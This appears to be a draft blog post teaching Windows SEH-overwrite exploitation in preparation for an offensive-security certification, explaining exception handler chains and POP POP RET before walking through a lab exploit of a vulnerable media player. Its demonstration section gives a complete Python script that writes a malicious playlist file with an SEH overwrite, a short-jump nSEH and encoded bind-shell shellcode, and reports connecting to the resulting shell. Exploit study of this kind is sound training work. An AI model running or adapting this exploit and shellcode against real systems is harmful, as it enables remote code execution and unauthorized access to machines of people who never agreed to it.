---
layout: single
title: "SEH primer for CTP"
excerpt: "A primer for n00bs like myself in preparation for the CTP course offered by Offensive Security"
date: 2020-07-10
header:
  #image: /assets/images/SHELLCODING32.png
  thumb: /assets/images/seh/lich_boi.jpg
  teaser: /assets/images/seh/lich_boi.jpg
  teaser_home_page: true
classes: wide
categories:
  - OSCE
  - infosec
tags:
  - ctp
  - osce
  - assembly
---
# THIS IS A DRAFT

![omg](/assets/images/seh/lich_boi.jpg)

## A primer on Structured Exception Handling (win32 exploitation)

*This article is written to help those who want a conceptual grasp on SEH exploits, I wrote this to help myself obtain a clear understanding before my CTP course starts.*

##### There are already many fantastic articles on this subject out there (some of which are linked throughout this article), which I encourage you to consume in order to get an even better understanding. 

#### What is an exception Handler?

In simple terms, an Exception Handler is exactly as the name implies, it *handles exceptions*, that is to say, when a program reaches something outside it's known functionality, an exception is raised (eg if a program wants an input between 2 and 5, and you put in 6). 

The program then needs to know how to *handle* this, either with an error message, exit code, or whatever else.

A Structured Exception Handler will follow a structure in  regards to handling exceptions.

For every exception handler, there is an Exception Registration Record structure.
These structures are chained together to create a "linked list" (a linked list contains a sequence of data records).

When an exception is triggered the OS scans down this list to evaluate the other exception functions until it finds a suitable exception handler for the current exception. (If no error is found, windows places a generic handler at the end to ensure it wil be handled in some manner).

We can overwrite the SEH address with an overflow, and thus control it.

When an exception occurs and the Exception Handler (SEH) is called, it’s value is put in EIP. Since we have control over SEH, we now have control over EIP and the execution flow of the application. 


#### SO WHY IS THIS RELEVANT TO US??!

Well, when we send an attack string which happens to overwrite the SEH, windows will zero out the CPU registers, thus breaking our jump to shellcode ;(

#### What we can do:

Overwrite SEH with a pointer to POP POP RETN. 

#### Why would we want to do that?

Well, after passing the first exception, EIP is overwritten with the value of SEH.
Second, the registers to which the bytes are popped into **are not important**, what is important is that when a POP occurs, ESP is shifted +4. When a RET is called, the ESP address are moved into EIP and executed.

SEH is located at ESP+8, so if we increment the stack pointer by 8bytes and return to the new pointer we will then be executing nSEH. 

EG a program crashes, registers get zeroed and SP +8 is overwritten with crash string eg 41414141

![SEH_overwrite](/assets/images/seh/SEH_overwrite.jpg)

When an exception occurs and the Exception Handler (SEH) is called, it’s value is put in EIP. Since we have control over SEH, we now have control over EIP and the execution flow of the application. 
We also know that the EstablisherFrame (which starts with Next SEH) is located at ESP+8, so if we can load that value into EIP we can continue to control the execution flow of the application.

## Demonstration

To demonstrate this, we use example exercise from [https://www.fuzzysecurity.com/tutorials/expDev/3.html](https://www.fuzzysecurity.com/tutorials/expDev/3.html) (vulnerable software link is broken, software available on exploit-DB [here](https://www.exploit-db.com/exploits/17803)).

**Another invaluable resource for this subject is: [https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/](https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/)**


As the steps to exploitation have already been covered, I will not run through them again here, only provide a brief summary.

First, we crash the application with a pattern attack string to locate the offset to SEH, which mona will do the heavy lifting for.

As below we see SEH overwritten and offset located:

![SEH_crash](/assets/images/seh/SEH_crash.jpg)

Calculate offsets with `!mona findmsp`

![SEH_control](/assets/images/seh/SEH_examine.jpg)

Now that we know the offset, we confirm control by crashing with another simple attack string as per the offset specified when we examined with `!mona findmsp`

```
nSEH="B"*4
SEH="C"*4
buffer = "A"*608 + nSEH + SEH + "D"*1384
```


Proof of control: 

![SEH_control](/assets/images/seh/SEH_control.JPG)

Now we choose an address to point to in a module containing POP+POP+RET with `!mona seh`

![SEH_pointer](/assets/images/seh/SEH_pointers.jpg)

Next:
* I choose 0x6162e557
* flip for little endian `"\x57\xe5\x62\x61"`
* modify my malicious playlist generator (obtained from [Fuzzy Security](https://www.fuzzysecurity.com/tutorials/expDev/3.html))
* restart the program in immunity, set a break point by going to expression 
* Import playlist
* Pass first exception (shift+F9)
* Hit breakpoint
* step through to call RET (F7)

Now as you can see below, EIP is now at the address of POP+POP+RET, step through until RET is called, and the next screenshot will show we have reached nSEH.

![SEH_break_PPR](/assets/images/seh/SEH_break_PPR.jpg)

![SEH_after_PPR](/assets/images/seh/SEH_after_PPR.jpg)

Now you may have guessed something based of the below sequence, that's right! if we continue we end up in an infinite loop - this is because as we hit BBBB, ANOTHER exception is raised, thus calling POP+POP+RET again...

So now we need to replace nSEH with opcode that will JMP over the next few bytes of space. A safe amount would be 10, and pad the beginning of shellcode with NOPS.

Once this is done some shellcode is generated and placed AFTER SEH but BEFORE the rest of the attack string which should be big enough to overflow the application as below:

```
#!/usr/bin/python -w
shellcode="\x90"*10+("\xd9\xc2\xd9\x74\x24\xf4\xba\x75\xad\xc8\xb1\x58\x33\xc9\xb1"
"\x53\x83\xe8\xfc\x31\x50\x13\x03\x25\xbe\x2a\x44\x39\x28\x28"
"\xa7\xc1\xa9\x4d\x21\x24\x98\x4d\x55\x2d\x8b\x7d\x1d\x63\x20"
"\xf5\x73\x97\xb3\x7b\x5c\x98\x74\x31\xba\x97\x85\x6a\xfe\xb6"
"\x05\x71\xd3\x18\x37\xba\x26\x59\x70\xa7\xcb\x0b\x29\xa3\x7e"
"\xbb\x5e\xf9\x42\x30\x2c\xef\xc2\xa5\xe5\x0e\xe2\x78\x7d\x49"
"\x24\x7b\x52\xe1\x6d\x63\xb7\xcc\x24\x18\x03\xba\xb6\xc8\x5d"
"\x43\x14\x35\x52\xb6\x64\x72\x55\x29\x13\x8a\xa5\xd4\x24\x49"
"\xd7\x02\xa0\x49\x7f\xc0\x12\xb5\x81\x05\xc4\x3e\x8d\xe2\x82"
"\x18\x92\xf5\x47\x13\xae\x7e\x66\xf3\x26\xc4\x4d\xd7\x63\x9e"
"\xec\x4e\xce\x71\x10\x90\xb1\x2e\xb4\xdb\x5c\x3a\xc5\x86\x08"
"\x8f\xe4\x38\xc9\x87\x7f\x4b\xfb\x08\xd4\xc3\xb7\xc1\xf2\x14"
"\xb7\xfb\x43\x8a\x46\x04\xb4\x83\x8c\x50\xe4\xbb\x25\xd9\x6f"
"\x3b\xc9\x0c\x05\x33\x6c\xff\x38\xbe\xce\xaf\xfc\x10\xa7\xa5"
"\xf2\x4f\xd7\xc5\xd8\xf8\x70\x38\xe3\x03\xb8\xb5\x05\x61\xaa"
"\x93\x9e\x1d\x08\xc0\x16\xba\x73\x22\x0f\x2c\x3b\x24\x88\x53"
"\xbc\x62\xbe\xc3\x37\x61\x7a\xf2\x47\xac\x2a\x63\xdf\x3a\xbb"
"\xc6\x41\x3a\x96\xb0\xe2\xa9\x7d\x40\x6c\xd2\x29\x17\x39\x24"
"\x20\xfd\xd7\x1f\x9a\xe3\x25\xf9\xe5\xa7\xf1\x3a\xeb\x26\x77"
"\x06\xcf\x38\x41\x87\x4b\x6c\x1d\xde\x05\xda\xdb\x88\xe7\xb4"
"\xb5\x67\xae\x50\x43\x44\x71\x26\x4c\x81\x07\xc6\xfd\x7c\x5e"
"\xf9\x32\xe9\x56\x82\x2e\x89\x99\x59\xeb\xb9\xd3\xc3\x5a\x52"
"\xba\x96\xde\x3f\x3d\x4d\x1c\x46\xbe\x67\xdd\xbd\xde\x02\xd8"
"\xfa\x58\xff\x90\x93\x0c\xff\x07\x93\x04")

filename="seh.plf"
#0x6162e557
buffer = "A"*608 + "\xeb\x10\x90\x90" + "\x57\xe5\x62\x61" + shellcode+ "B"*(1384-len(shellcode))
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()

```

Now we generate our malicious playlist and open it in again - this time immunity does not register a crash, and we are able to connect to the bind shell payload:

![SEH_exploited](/assets/images/seh/SEH_exploited1.jpg)

So the takeaways for exploiting SEH are:

* As always calculate the overflow amount
* calculate the offset to SEH
* confirm control of nSEH and SEH
* Use SEH to move up 8 to nSEH
* Use nSEH to Jump back over SEH and into shellcode


#### I hope as an aspiring OSCE/security researcher you found this informative and above else *helpful* - I will be following this up with at least an article on ASLR.


# THIS IS A DRAFT
